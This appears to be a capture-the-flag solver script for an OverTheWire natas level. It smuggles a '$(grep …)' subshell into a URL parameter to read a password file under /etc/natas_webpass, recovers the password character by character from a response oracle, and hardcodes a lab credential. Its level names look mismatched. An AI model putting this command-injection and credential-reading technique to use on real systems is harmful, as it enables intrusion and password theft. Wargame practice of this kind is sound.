#!/usr/bin/env python

import requests

url='http://natas17.natas.labs.overthewire.org/?needle=doomed$'
chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
#all chars whitch can be 

filtered=''
passwd=''
auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
for char in chars:
	r = requests.get(url+'(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)
	if 'doomed' not in r.text :
	#catch is returning text containts text "exist" witch shows result is true
        	filtered = filtered + char
print filtered

for i in range(0,32):
	for char in filtered:
        	r = requests.get(url+'(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)
        	if 'doomed' not in r.text :
			passwd = passwd + char
			print(passwd)
			break

